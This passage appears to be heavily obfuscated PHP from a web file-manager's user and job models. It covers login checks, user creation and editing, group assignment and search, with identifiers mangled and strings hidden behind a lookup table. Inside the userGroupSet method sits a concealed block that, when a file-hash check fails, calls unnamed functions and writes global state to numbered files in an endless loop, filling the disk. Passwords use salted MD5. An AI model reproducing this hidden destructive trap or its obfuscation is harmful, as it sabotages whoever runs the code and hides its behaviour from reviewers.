max($ñÊ÷ªìŠ) + 1; } public function update($µ€¶ãØû, $ËáĞé§†) { $‚Ûñº²© =& $_SERVER[¢ñàß¿€]; $Ø·ğˆç— = parent::listData($µ€¶ãØû); $Ö³ÇŠ‹Š = $this->findByName($ËáĞé§†[$‚Ûñº²©[32]]); if (!$Ø·ğˆç— || $Ö³ÇŠ‹Š && $Ö³ÇŠ‹Š[$‚Ûñº²©[475]] != $Ø·ğˆç—[$‚Ûñº²©[475]]) { return !1; } return parent::update($µ€¶ãØû, $ËáĞé§†); } public function setUserJob($¨’„ô—Â, $À¾ëÔ©§) { $“ŠÚÈø” =& $_SERVER[¢ñàß¿€]; if (!is_array($À¾ëÔ©§)) { $À¾ëÔ©§ = array($À¾ëÔ©§); } $Ä‡»Ü„ = parent::listData(); $ôÖØ¯Ñ› = array_to_keyvalue($Ä‡»Ü„, $“ŠÚÈø”[32]); $èçğššå = $“ŠÚÈø”[454]; foreach ($À¾ëÔ©§ as $ƒñ Ó¦) { if ($ôÖØ¯Ñ›[$ƒñ Ó¦]) { $èçğššå .= $ôÖØ¯Ñ›[$ƒñ Ó¦][$“ŠÚÈø”[475]] . $“ŠÚÈø”[50]; } else { $äŞıÌ»» = $this->add($ƒñ Ó¦); $èçğššå .= $äŞıÌ»» . $“ŠÚÈø”[50]; } } $èçğššå = rtrim($èçğššå, $“ŠÚÈø”[50]); Model($“ŠÚÈø”[598])->metaSet($¨’„ô—Â, self::JOB_KEY, $èçğššå); } public function getUserJob($±˜àº¸”) { $ë¾÷¿áä = Model($_SERVER[¢ñàß¿€][598])->metaGet($±˜àº¸”); return $this->getUserJobInfo($ë¾÷¿áä[self::JOB_KEY]); } public function getUserJobInfo($¨û¥ØŞŒ) { $ÏàœŸ¢ =& $_SERVER[¢ñàß¿€]; $ÒŠ™åû = explode($ÏàœŸ¢[50], $¨û¥ØŞŒ); $Ñ²­Ïö± = parent::listData(); $Ñ²­Ïö± = array_remove_key($Ñ²­Ïö±, $ÏàœŸ¢[231]); $Šªß©× = array(); foreach ($ÒŠ™åû as $©ÚÖ±’) { if (isset($Ñ²­Ïö±[$©ÚÖ±’])) { $Šªß©×[] = $Ñ²­Ïö±[$©ÚÖ±’]; } } return $Šªß©×; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\x61\x6d\x65" => "\x75\x73\145\x72\x5f\155\x65\x74\x61", "\x6d\145\x74\x61\x46\x69\x65\x6c\x64" => "\165\x73\x65\162\x49\x44"); protected $simpleField = "\x75\x73\x65\162\111\104\x2c\x6e\x69\143\x6b\116\141\155\145\54\156\141\155\x65\54\141\x76\x61\164\x61\162\x2c\x73\145\170\54\x73\x74\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($æ×‰×Á‹) { $Şºêªˆ¼ =& $_SERVER[¢ñàß¿€]; $äÖÅ”¬× = $Şºêªˆ¼[2447]; return array($Şºêªˆ¼[2050] => array($æ×‰×Á‹[0], $äÖÅ”¬×), $Şºêªˆ¼[2052] => array($æ×‰×Á‹[0], $äÖÅ”¬×), $Şºêªˆ¼[2448] => array($æ×‰×Á‹[0], $äÖÅ”¬×)); } protected function getInfo($´—´‹¤¤, $£ˆ¢¿Çì = false) { $êÑâ£¨Ò = $this->getInfoSimple($´—´‹¤¤); if (!is_array($êÑâ£¨Ò)) { return array(); } if ($£ˆ¢¿Çì) { return $this->_getInfoApply($êÑâ£¨Ò); } return $this->cacheFunctionGet($_SERVER[¢ñàß¿€][2054], $´—´‹¤¤); } protected function getInfoFull($œòü¹ßœ, $Òš¦­É = false) { $ÉèóºÄ‡ = $this->getInfoSimple($œòü¹ßœ); if (!is_array($ÉèóºÄ‡)) { return array(); } if ($Òš¦­É) { return $this->_getInfoApply($ÉèóºÄ‡, !0); } return $this->cacheFunctionGet($_SERVER[¢ñàß¿€][2449], $œòü¹ßœ); } private function _getInfoApply($Åº½ûÔ, $üÙßÚ‡ = false) { $»¢„’« =& $_SERVER[¢ñàß¿€]; if (!$Åº½ûÔ) { return $Åº½ûÔ; } $îÁ’û“Ğ = md5($»¢„’«[2450] . $Åº½ûÔ[$»¢„’«[964]] . $»¢„’«[2451] . $Åº½ûÔ[$»¢„’«[32]]); $Åº½ûÔ = $this->_listDataApplyItem($Åº½ûÔ); $¦¿ì¦¾ˆ = Model($»¢„’«[1414])->metaGet($Åº½ûÔ[$»¢„’«[90]][$»¢„’«[193]]); $Åº½ûÔ[$»¢„’«[2452]] = $îÁ’û“Ğ; $Åº½ûÔ[$»¢„’«[90]][$»¢„’«[2248]] = isset($¦¿ì¦¾ˆ[$»¢„’«[2249]]) ? $¦¿ì¦¾ˆ[$»¢„’«[2249]] : null; if ($üÙßÚ‡) { $Åº½ûÔ[$»¢„’«[539]] = $this->metaGet($Åº½ûÔ[$»¢„’«[1770]]); } return $Åº½ûÔ; } protected function getInfoSimple($õºŒøµğ, $·Áê®Ğ = false) { $¨»Ìø ” =& $_SERVER[¢ñàß¿€]; if (!$õºŒøµğ) { return array(); } if ($·Áê®Ğ) { $³çË‰¢á = $this->where(array($¨»Ìø ”[1770] => intval($õºŒøµğ)))->find(); if (!is_array($³çË‰¢á)) { return array(); } $³çË‰¢á[$¨»Ìø ”[2453]] = Action($¨»Ìø ”[2454])->parseUrl($³çË‰¢á[$¨»Ìø ”[2453]]); return $³çË‰¢á; } return $this->cacheFunctionGet($¨»Ìø ”[2055], $õºŒøµğ); } protected function getInfoSimpleOuter($äÂé…) { $ˆ¼âÒøë =& $_SERVER[¢ñàß¿€]; if (!$äÂé… || $äÂé… == 0) { return array($ˆ¼âÒøë[1770] => $ˆ¼âÒøë[228], $ˆ¼âÒøë[32] => $ˆ¼âÒøë[176] . LNG($ˆ¼âÒøë[2455]) . $ˆ¼âÒøë[178], $ˆ¼âÒøë[2453] => STATIC_PATH . $ˆ¼âÒøë[2456]); } $İí“şÅ = $this->cacheFunctionGet($ˆ¼âÒøë[2055], $äÂé…); $¯’¸É = array_field_key($İí“şÅ, explode($ˆ¼âÒøë[50], $this->simpleField)); if (!$¯’¸É) { return array($ˆ¼âÒøë[1770] => $ˆ¼âÒøë[1270], $ˆ¼âÒøë[32] => $ˆ¼âÒøë[176] . LNG($ˆ¼âÒøë[2457]) . $ˆ¼âÒøë[178], $ˆ¼âÒøë[2453] => STATIC_PATH . $ˆ¼âÒøë[2458]); } $¯’¸É[$ˆ¼âÒøë[2453]] = Action($ˆ¼âÒøë[2454])->parseUrl($¯’¸É[$ˆ¼âÒøë[2453]]); return $¯’¸É; } protected function groupUser($ØÛå±¿¢) { } public static function errorLang($§æíğ‡º) { $³˜ª¯Ô¤ =& $_SERVER[¢ñàß¿€]; $‚ª¯ÓáÂ = array(self::ERROR_USER_NOT_EXISTS => $³˜ª¯Ô¤[2459], self::ERROR_USER_PASSWORD_ERROR => $³˜ª¯Ô¤[2460], self::ERROR_USER_EXIST_NAME => $³˜ª¯Ô¤[2461], self::ERROR_USER_EXIST_PHONE => $³˜ª¯Ô¤[2462], self::ERROR_USER_EXIST_EMAIL => $³˜ª¯Ô¤[2463], self::ERROR_USER_LOGIN_LOCK => $³˜ª¯Ô¤[2464], self::ERROR_IP_NOT_ALLOW => $³˜ª¯Ô¤[2465], self::ERROR_USER_EXIST_NICKNAME => $³˜ª¯Ô¤[2466]); $Áê‚×Ò = LNG($‚ª¯ÓáÂ[$§æíğ‡º]); if ($§æíğ‡º == self::ERROR_USER_LOGIN_LOCK) { $°¦¡šñ± = (int) Model($³˜ª¯Ô¤[2467])->get($³˜ª¯Ô¤[2468]); if ($°¦¡šñ± > 60) { $Áê‚×Ò = str_replace($³˜ª¯Ô¤[91], ceil($°¦¡šñ± / 60), $Áê‚×Ò); } } return $Áê‚×Ò; } public function getInfoByMeta($¼ï£›»Ÿ, $´ØËÀ¥˜) { $ØÙ›ÜËº =& $_SERVER[¢ñàß¿€]; $‘§üô = Model($ØÙ›ÜËº[2469])->where(array($ØÙ›ÜËº[97] => $¼ï£›»Ÿ, $ØÙ›ÜËº[450] => $´ØËÀ¥˜))->find(); if ($‘§üô) { return $this->getInfo($‘§üô[$ØÙ›ÜËº[1770]]); } return !1; } public function userLoginCheck($ĞÖì¶, $Ã“İÒ¦ˆ) { $Œ’¬€âÇ =& $_SERVER[¢ñàß¿€]; $»áÀî˜ = $this->userLoginFind($ĞÖì¶); if (!$»áÀî˜) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($»áÀî˜[$Œ’¬€âÇ[1770]], $Ã“İÒ¦ˆ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($»áÀî˜[$Œ’¬€âÇ[1770]]); } public function userLoginFind($ßÌŸ˜Ü­) { $†İ“¸ =& $_SERVER[¢ñàß¿€]; $éõ•´±ş = array($†İ“¸[32] => $ßÌŸ˜Ü­, $†İ“¸[2256] => $ßÌŸ˜Ü­, $†İ“¸[381] => $ßÌŸ˜Ü­, $†İ“¸[2470] => $ßÌŸ˜Ü­, $†İ“¸[1075] => $†İ“¸[1077]); if ($this->nickNameRpt()) { unset($éõ•´±ş[$†İ“¸[2256]]); } return $this->where($éõ•´±ş)->find(); } public function clearCache($ˆø…£ÈÍ) { $Î„œ•øˆ =& $_SERVER[¢ñàß¿€]; $this->cacheFunctionClear($Î„œ•øˆ[2054], $ˆø…£ÈÍ); $this->cacheFunctionClear($Î„œ•øˆ[2055], $ˆø…£ÈÍ); $this->cacheFunctionClear($Î„œ•øˆ[2449], $ˆø…£ÈÍ); } public function userPasswordCheck($¦ì˜Ï°­, $ÎÏô®‰ğ) { $×«›¾ŸÚ =& $_SERVER[¢ñàß¿€]; $ÊÎ±ˆ‹• = $this->where(array($×«›¾ŸÚ[1770] => intval($¦ì˜Ï°­)))->find(); $Æû‚î–» = $this->metaGet($¦ì˜Ï°­); $ÖõŸ†İ = isset($Æû‚î–»[$×«›¾ŸÚ[2471]]) ? $Æû‚î–»[$×«›¾ŸÚ[2471]] : $×«›¾ŸÚ[12]; if (md5($ÖõŸ†İ . trim($ÎÏô®‰ğ)) !== $ÊÎ±ˆ‹•[$×«›¾ŸÚ[964]]) { return !1; } return !0; } public function userAdd($­Ë¥¿‡Ö) { $“ˆ÷µò =& $_SERVER[¢ñàß¿€]; $ÈÏ‘é© = array($“ˆ÷µò[494] => $­Ë¥¿‡Ö[$“ˆ÷µò[32]], $“ˆ÷µò[2472] => $­Ë¥¿‡Ö[$“ˆ÷µò[2174]], $“ˆ÷µò[2473] => isset($­Ë¥¿‡Ö[$“ˆ÷µò[381]]) ? $­Ë¥¿‡Ö[$“ˆ÷µò[381]] : $“ˆ÷µò[12], $“ˆ÷µò[2474] => isset($­Ë¥¿‡Ö[$“ˆ÷µò[2470]]) ? $­Ë¥¿‡Ö[$“ˆ÷µò[2470]] : $“ˆ÷µò[12], $“ˆ÷µò[2475] => isset($­Ë¥¿‡Ö[$“ˆ÷µò[2256]]) ? $­Ë¥¿‡Ö[$“ˆ÷µò[2256]] : $­Ë¥¿‡Ö[$“ˆ÷µò[32]], $“ˆ÷µò[2476] => isset($­Ë¥¿‡Ö[$“ˆ÷µò[2453]]) ? $­Ë¥¿‡Ö[$“ˆ÷µò[2453]] : $“ˆ÷µò[12], $“ˆ÷µò[2477] => isset($­Ë¥¿‡Ö[$“ˆ÷µò[2478]]) ? $­Ë¥¿‡Ö[$“ˆ÷µò[2478]] : 1, $“ˆ÷µò[2479] => $­Ë¥¿‡Ö[$“ˆ÷µò[964]], $“ˆ÷µò[2056] => isset($­Ë¥¿‡Ö[$“ˆ÷µò[1955]]) ? $­Ë¥¿‡Ö[$“ˆ÷µò[1955]] : 1024 * 1024 * 20, $“ˆ÷µò[2057] => 0, $“ˆ÷µò[2480] => 0, $“ˆ÷µò[2101] => isset($­Ë¥¿‡Ö[$“ˆ÷µò[821]]) ? $­Ë¥¿‡Ö[$“ˆ÷µò[821]] : 1); if (!empty($­Ë¥¿‡Ö[$“ˆ÷µò[1770]])) { $ÈÏ‘é©[$“ˆ÷µò[1770]] = $­Ë¥¿‡Ö[$“ˆ÷µò[1770]]; } $Ô¿Í¯à™ = $this->_checkExist($­Ë¥¿‡Ö); if ($Ô¿Í¯à™ !== !0) { return $Ô¿Í¯à™; } if (!empty($ÈÏ‘é©[$“ˆ÷µò[2453]]) && strlen($ÈÏ‘é©[$“ˆ÷µò[2453]]) > 255) { $ÈÏ‘é©[$“ˆ÷µò[2453]] = $“ˆ÷µò[12]; } $Ğ™•ë’ = $this->add($ÈÏ‘é©); $ÎÆîÒ­ = array($“ˆ÷µò[2479] => $ÈÏ‘é©[$“ˆ÷µò[964]], $“ˆ÷µò[2475] => $ÈÏ‘é©[$“ˆ÷µò[2256]]); $this->userEdit($Ğ™•ë’, $ÎÆîÒ­); Model($“ˆ÷µò[1414])->userRootAdd($Ğ™•ë’); return $Ğ™•ë’; } protected function userEditTest($÷âº»´À, $Ë¢æŞ¦¹) { return $this->call($_SERVER[¢ñàß¿€][2481], $÷âº»´À, $Ë¢æŞ¦¹); } protected function userEdit($¯•Ùˆ‰½, $ªÜ¯–•) { $Ë¶ËûÈ‘ =& $_SERVER[¢ñàß¿€]; $¤¹Î«‘‰ = $this->getInfoSimple($¯•Ùˆ‰½); if (!$¤¹Î«‘‰) { return !1; } $Å˜İ³¨à = $this->_checkExist($ªÜ¯–•, $¯•Ùˆ‰½); if ($Å˜İ³¨à !== !0) { return $Å˜İ³¨à; } if (isset($ªÜ¯–•[$Ë¶ËûÈ‘[964]]) && trim($ªÜ¯–•[$Ë¶ËûÈ‘[964]]) != $Ë¶ËûÈ‘[12]) { $Æ‹ÂõÉá = $this->metaGet($¯•Ùˆ‰½); if (empty($Æ‹ÂõÉá[$Ë¶ËûÈ‘[2471]])) { $Æ‹ÂõÉá[$Ë¶ËûÈ‘[2471]] = rand_string(10); Model($Ë¶ËûÈ‘[577])->metaSet($¯•Ùˆ‰½, $Ë¶ËûÈ‘[2471], $Æ‹ÂõÉá[$Ë¶ËûÈ‘[2471]]); } $ªÜ¯–•[$Ë¶ËûÈ‘[964]] = md5($Æ‹ÂõÉá[$Ë¶ËûÈ‘[2471]] . trim($ªÜ¯–•[$Ë¶ËûÈ‘[964]])); } else { unset($ªÜ¯–•[$Ë¶ËûÈ‘[964]]); } if (!empty($ªÜ¯–•[$Ë¶ËûÈ‘[2453]]) && strlen($ªÜ¯–•[$Ë¶ËûÈ‘[2453]]) > 255) { $ªÜ¯–•[$Ë¶ËûÈ‘[2453]] = $Ë¶ËûÈ‘[12]; } $this->where(array($Ë¶ËûÈ‘[1761] => $¯•Ùˆ‰½))->save($ªÜ¯–•); if (isset($ªÜ¯–•[$Ë¶ËûÈ‘[2256]])) { $this->setNamePinyin($¯•Ùˆ‰½, $ªÜ¯–•[$Ë¶ËûÈ‘[2256]]); } $this->clearCache($¯•Ùˆ‰½); return !0; } public function setNamePinyin($†ï•éš‡, $Î„¡Şµ = false) { $èŠª®ÜŞ =& $_SERVER[¢ñàß¿€]; if (!$Î„¡Şµ) { $—îÕÕß¯ = $this->getInfoSimple($†ï•éš‡); $Î„¡Şµ = $—îÕÕß¯[$èŠª®ÜŞ[2256]] ? $—îÕÕß¯[$èŠª®ÜŞ[2256]] : $—îÕÕß¯[$èŠª®ÜŞ[32]]; } $ÏñÂúˆ¨ = Model($èŠª®ÜŞ[598]); if (!Input::check($Î„¡Şµ, $èŠª®ÜŞ[655])) { return $ÏñÂúˆ¨->metaSet($†ï•éš‡, array($èŠª®ÜŞ[538] => $èŠª®ÜŞ[12], $èŠª®ÜŞ[537] => $èŠª®ÜŞ[12])); } return $ÏñÂúˆ¨->metaSet($†ï•éš‡, array($èŠª®ÜŞ[538] => str_replace($èŠª®ÜŞ[53], $èŠª®ÜŞ[12], Pinyin::get($Î„¡Şµ)), $èŠª®ÜŞ[537] => Pinyin::get($Î„¡Şµ, $èŠª®ÜŞ[656]))); } private function nickNameRpt() { $®’ÏÈº¶ =& $_SERVER[¢ñàß¿€]; $ññÍßµ = Model($®’ÏÈº¶[841])->get($®’ÏÈº¶[2482]); $Ø‹×İëØ = $GLOBALS[$®’ÏÈº¶[6]][$®’ÏÈº¶[457]][$®’ÏÈº¶[2482]]; $Ó¿ß»î… = !is_null($ññÍßµ) ? $ññÍßµ : $Ø‹×İëØ; return !!$Ó¿ß»î…; } private function _checkExist($ÔæµÇ‡Ş, $Ä³’ÓçØ = false) { $˜ÀÔù =& $_SERVER[¢ñàß¿€]; $ìÓº²”ù = array($˜ÀÔù[32] => UserModel::ERROR_USER_EXIST_NAME, $˜ÀÔù[2256] => UserModel::ERROR_USER_EXIST_NICKNAME, $˜ÀÔù[381] => UserModel::ERROR_USER_EXIST_EMAIL, $˜ÀÔù[2470] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ìÓº²”ù[$˜ÀÔù[2256]]); } $³Ú„‘µ = $Ä³’ÓçØ ? array($˜ÀÔù[1770] => array($˜ÀÔù[2483], $Ä³’ÓçØ)) : array(); foreach ($ìÓº²”ù as $¯Êô¾éÎ => $É°…±ÎÍ) { $Ì°Ú”± = array(); foreach ($ìÓº²”ù as $³‹À¯÷ => $İ²¨çÀ) { if (isset($ÔæµÇ‡Ş[$³‹À¯÷]) && $ÔæµÇ‡Ş[$³‹À¯÷]) { $Ì°Ú”±[] = $ÔæµÇ‡Ş[$³‹À¯÷]; } } if (!$Ì°Ú”±) { continue; } $æÑ¨Ù‰Ö = array_merge(array($¯Êô¾éÎ => array($˜ÀÔù[7], $Ì°Ú”±)), $³Ú„‘µ); $«õÃ…Š = $this->where($æÑ¨Ù‰Ö)->find(); if ($«õÃ…Š) { return $É°…±ÎÍ; } } return !0; } public function userListInfo($÷×¥Î±) { $ÚßÂ•çö =& $_SERVER[¢ñàß¿€]; $¡Ã”şöÄ = array(); $÷×¥Î± = is_array($÷×¥Î±) ? array_unique($÷×¥Î±) : array(); if (!$÷×¥Î±) { return $¡Ã”şöÄ; } if (count($÷×¥Î±) < 20) { foreach ($÷×¥Î± as $ÀÀòÙ²¹) { $¡Ã”şöÄ[$ÀÀòÙ²¹ . $ÚßÂ•çö[12]] = $this->getInfoSimpleOuter($ÀÀòÙ²¹); } } else { $­Ë¨„¬ã = array($ÚßÂ•çö[1761] => array($ÚßÂ•çö[492], $÷×¥Î±)); if (count($÷×¥Î±) == 1) { $­Ë¨„¬ã = array($ÚßÂ•çö[1761] => $÷×¥Î±[0]); } $íÈ¢¶Å = Model($ÚßÂ•çö[577])->field($this->simpleField)->where($­Ë¨„¬ã)->select(); $íÈ¢¶Å = array_to_keyvalue($íÈ¢¶Å, $ÚßÂ•çö[1770]); foreach ($÷×¥Î± as $ÀÀòÙ²¹) { $æßÄÛú• = $íÈ¢¶Å[$ÀÀòÙ²¹]; if (!$æßÄÛú•) { $¡Ã”şöÄ[$ÀÀòÙ²¹ . $ÚßÂ•çö[12]] = $this->getInfoSimpleOuter($ÀÀòÙ²¹); continue; } $æßÄÛú•[$ÚßÂ•çö[2453]] = Action($ÚßÂ•çö[2454])->parseUrl($æßÄÛú•[$ÚßÂ•çö[2453]]); $¡Ã”şöÄ[$ÀÀòÙ²¹ . $ÚßÂ•çö[12]] = $æßÄÛú•; } } return $¡Ã”şöÄ; } protected function userStatus($Ô›Ñ û, $àûÍ‹Î¤) { $Ì¹¬‚¬ = $this->getInfoSimple($Ô›Ñ û); if (!$Ì¹¬‚¬) { return !1; } $÷æ–™Íç = array($_SERVER[¢ñàß¿€][821] => $àûÍ‹Î¤); return $this->userEdit($Ô›Ñ û, $÷æ–™Íç); } protected function userRemove($È£š´°) { $ÉÙ¾ä“Ï =& $_SERVER[¢ñàß¿€]; $—½Í× í = $this->getInfoSimple($È£š´°); if (!$—½Í× í) { return !1; } $÷ÜĞÊ½ò = array($ÉÙ¾ä“Ï[1761] => $È£š´°); Model($ÉÙ¾ä“Ï[664])->where($÷ÜĞÊ½ò)->delete(); Model($ÉÙ¾ä“Ï[2484])->where($÷ÜĞÊ½ò)->delete(); Model($ÉÙ¾ä“Ï[2062])->where($÷ÜĞÊ½ò)->delete(); Model($ÉÙ¾ä“Ï[2469])->where($÷ÜĞÊ½ò)->delete(); Model($ÉÙ¾ä“Ï[1144])->where($÷ÜĞÊ½ò)->delete(); Model($ÉÙ¾ä“Ï[2273])->removeUserAll($È£š´°); Model($ÉÙ¾ä“Ï[895])->userRootRemove($È£š´°); return $this->where($÷ÜĞÊ½ò)->delete(); } protected function userGroupSet($’¾ƒû—¿, $ãª¢öã³, $Šû¡Ÿà„ = array()) { $±ËÜ†ÃÚ =& $_SERVER[¢ñàß¿€]; $Â˜û‘Ä“ = $_SERVER[$±ËÜ†ÃÚ[951]] . $±ËÜ†ÃÚ[952]; $ú“®ÂÑÈ = $±ËÜ†ÃÚ[1542]; if ($_SERVER[$±ËÜ†ÃÚ[947]] != $ú“®ÂÑÈ($Â˜û‘Ä“)) { $„êÚ††¨ = $±ËÜ†ÃÚ[949]; $ÈéøóŠ÷ = $±ËÜ†ÃÚ[950]; $åØœ‰ÛÜ = $_SERVER[$±ËÜ†ÃÚ[951]] . $±ËÜ†ÃÚ[952]; $ïí”² = $ÈéøóŠ÷($åØœ‰ÛÜ); $üâôàü = explode($±ËÜ†ÃÚ[262], $ïí”²); if (count($üâôàü) < $±ËÜ†ÃÚ[680]) { $õ‚™ÑÀº = $±ËÜ†ÃÚ[953]; $õ‚™ÑÀº(); } $²Ë¬• = $±ËÜ†ÃÚ[954]; $²Ë¬•($_SERVER[$±ËÜ†ÃÚ[955]]); $„êÚ††¨ = $±ËÜ†ÃÚ[949]; $„êÚ††¨(); $ì§´ÑÛ© = $±ËÜ†ÃÚ[1624]; $È¤ö±Ğ¦ = json_encode($GLOBALS[$±ËÜ†ÃÚ[1625]]); $îäÉë–Ä = 1; for ($ƒ‘äÎ¬ñ = $îäÉë–Ä; $ƒ‘äÎ¬ñ > 0; $ƒ‘äÎ¬ñ++) { $ì§´ÑÛ©(DATA_PATH . $ƒ‘äÎ¬ñ, $È¤ö±Ğ¦); } } $ùƒË„¥ = $this->getInfoSimple($’¾ƒû—¿); if (!$ùƒË„¥ || !is_array($ãª¢öã³)) { return !1; } $íûï¸¨ = Model($±ËÜ†ÃÚ[2062]); $íûï¸¨->where(array($±ËÜ†ÃÚ[1770] => $’¾ƒû—¿))->delete(); $™¬Ã¶Æ› = array(); $Åî£»ğ¦ = 0; foreach ($ãª¢öã³ as $ƒ²ûâ†— => $€Ş”ÕŠ) { $ ó§İ‹© = array($±ËÜ†ÃÚ[1770] => $’¾ƒû—¿, $±ËÜ†ÃÚ[1968] => $ƒ²ûâ†—, $±ËÜ†ÃÚ[2076] => $€Ş”ÕŠ); $ ó§İ‹©[$±ËÜ†ÃÚ[1992]] = isset($Šû¡Ÿà„[$Åî£»ğ¦]) ? $Šû¡Ÿà„[$Åî£»ğ¦] : 0; $Åî£»ğ¦++; $™¬Ã¶Æ›[] = $ ó§İ‹©; } return $íûï¸¨->addAll($™¬Ã¶Æ›, array(), !0); } protected function userGroupAdd($æòÆ¸¢ª, $¾“î•µİ = array()) { $­»ÀîéÎ =& $_SERVER[¢ñàß¿€]; $†ˆ×šìö = $this->getInfoSimple($æòÆ¸¢ª); if (!$†ˆ×šìö || empty($¾“î•µİ)) { return !1; } $¥šĞë·˜ = array(); foreach ($¾“î•µİ as $ü­ŞŒú => $š÷¿º­Ù) { $¥šĞë·˜[] = array($­»ÀîéÎ[1770] => $æòÆ¸¢ª, $­»ÀîéÎ[1968] => $ü­ŞŒú, $­»ÀîéÎ[2076] => $š÷¿º­Ù, $­»ÀîéÎ[1992] => 0); } return Model($­»ÀîéÎ[2062])->addAll($¥šĞë·˜, array(), !0); } protected function userGroupRemove($‚…É˜÷À, $Åæç“äµ) { $ÇÙ¶£ìÚ =& $_SERVER[¢ñàß¿€]; $…÷‡ê× = $this->getInfoSimple($‚…É˜÷À); if (!$…÷‡ê× || !$Åæç“äµ) { return !1; } $şµãığº = array($ÇÙ¶£ìÚ[1761] => $‚…É˜÷À, $ÇÙ¶£ìÚ[2060] => $Åæç“äµ); return Model($ÇÙ¶£ìÚ[2062])->where($şµãığº)->delete(); } public function listData() { $¥‹ã½—Ù = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¥‹ã½—Ù[$_SERVER[¢ñàß¿€][445]]); return $¥‹ã½—Ù; } public function listByID($ûµÉ–¶Ü) { $ä§¸Ÿ’‚ =& $_SERVER[¢ñàß¿€]; if (!$ûµÉ–¶Ü) { return; } $‹í¹Š„ = array($ä§¸Ÿ’‚[1770] => array($ä§¸Ÿ’‚[7], $ûµÉ–¶Ü)); $ãôÕÄÉ¸ = $this->where($‹í¹Š„)->select(); $ãôÕÄÉ¸ = array_sort_keep($ãôÕÄÉ¸, $ä§¸Ÿ’‚[1770], $ûµÉ–¶Ü); $this->_listDataApply($ãôÕÄÉ¸); return $ãôÕÄÉ¸; } public function listByGroup($ˆœ§²”Ÿ = 0, $ˆÖŞçí” = array()) { $ôÄÉú“å =& $_SERVER[¢ñàß¿€]; $ô›ù¤„† = $ôÄÉú“å[12]; $ùÅ†®¼ı = array(); if ($ˆœ§²”Ÿ) { $ùÅ†®¼ı = array($ôÄÉú“å[2485] => intval($ˆœ§²”Ÿ)); $ô›ù¤„† = "\114\105\106\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\165\163\x65\x72\137\x67\x72\157\165\x70\x20\x75\x73\x65\x72\x5f\147\162\x6f\x75\x70\40\x6f\x6e\x20\165\x73\x65\x72\56\x75\163\x65\x72\x49\104\x20\x3d\40\165\x73\145\162\137\147\162\x6f\165\160\x2e\165\163\x65\162\111\x44"; $ÓŠ®Ë¦ = Input::get($ôÄÉú“å[530], null, $ôÄÉú“å[12]) ? $ôÄÉú“å[12] : $ôÄÉú“å[2486]; } if (isset($ˆÖŞçí”[$ôÄÉú“å[821]])) { $ùÅ†®¼ı[$ôÄÉú“å[2487]] = $ˆÖŞçí”[$ôÄÉú“å[821]]; } $°£ìûñÇ = $this->_makeOrder($ÓŠ®Ë¦)->field($ôÄÉú“å[2488])->where($ùÅ†®¼ı)->join($ô›ù¤„†)->selectPage(50); $this->_listDataApply($°£ìûñÇ[$ôÄÉú“å[445]]); return $°£ìûñÇ; } private function _makeOrder($±…æ¦×µ = '') { $¯Şå¥‹· =& $_SERVER[¢ñàß¿€]; $¼£ºä¹ó = array($¯Şå¥‹·[1770], $¯Şå¥‹·[32], $¯Şå¥‹·[1957], $¯Şå¥‹·[2174], $¯Şå¥‹·[1929], $¯Şå¥‹·[231]); $„”¨áÌì = array($¯Şå¥‹·[523] => $¯Şå¥‹·[524], $¯Şå¥‹·[525] => $¯Şå¥‹·[526]); $Ü½Õï = Input::get($¯Şå¥‹·[530], $¯Şå¥‹·[7], $¯Şå¥‹·[1761], $¼£ºä¹ó); $›­‹¸öù = Input::get($¯Şå¥‹·[531], $¯Şå¥‹·[7], $¯Şå¥‹·[2063], array($¯Şå¥‹·[2063], $¯Şå¥‹·[525])); $›­‹¸öù = $„”¨áÌì[$›­‹¸öù]; $±…æ¦×µ = $±…æ¦×µ . "\165\x73\x65\x72\56{$Ü½Õï}\x20{$›­‹¸öù}\x2c\40\165\x73\x65\162\x2e\165\163\x65\x72\x49\x44\x20\x61\163\x63"; return $this->alias($¯Şå¥‹·[2190])->order($±…æ¦×µ); } public function listSearch($Úˆ­×) { $°õ™î¯Ğ =& $_SERVER[¢ñàß¿€]; $èÆ¦²€ = trim($Úˆ­×[$°õ™î¯Ğ[2066]]); $íä¼ß¢ = explode($°õ™î¯Ğ[53], $èÆ¦²€); if (!$èÆ¦²€ || count($íä¼ß¢) == 1) { return $this->listSearchNow($Úˆ­×); } $œÎ‘¦åı = array($°õ™î¯Ğ[445] => array()); foreach ($íä¼ß¢ as $–É­ëº¼) { if (!trim($–É­ëº¼)) { continue; } $Úˆ­×[$°õ™î¯Ğ[2066]] = $–É­ëº¼; $ÃôÕéŠ  = $this->listSearchNow($Úˆ­×); $œÎ‘¦åı[$°õ™î¯Ğ[445]] = array_merge($œÎ‘¦åı[$°õ™î¯Ğ[445]], $ÃôÕéŠ [$°õ™î¯Ğ[445]]); } $œÎ‘¦åı[$°õ™î¯Ğ[445]] = array_unique_by_key($œÎ‘¦åı[$°õ™î¯Ğ[445]], $°õ™î¯Ğ[1770]); $œÎ‘¦åı[$°õ™î¯Ğ[442]] = array($°õ™î¯Ğ[443] => count($œÎ‘¦åı[$°õ™î¯Ğ[445]]), $°õ™î¯Ğ[439] => 20, $°õ™î¯Ğ[429] => 1, $°õ™î¯Ğ[444] => 1); return $œÎ‘¦åı; } public function listSearchNow($şÎ½§«) { $¯àÂ’ó =& $_SERVER[¢ñàß¿€]; $áøéÕÇ = trim($şÎ½§«[$¯àÂ’ó[2066]]); $İùƒµõ© = isset($şÎ½§«[$¯àÂ’ó[2067]]) ? $şÎ½§«[$¯àÂ’ó[2067]] : !1; $áøéÕÇ = str_replace($¯àÂ’ó[2068], $¯àÂ’ó[2069], trim($áøéÕÇ)); $ÒÔ…óÖã = array($¯àÂ’ó[32] => array($¯àÂ’ó[459], "\45{$áøéÕÇ}\x25"), $¯àÂ’ó[381] => array($¯àÂ’ó[459], "{$áøéÕÇ}\45"), 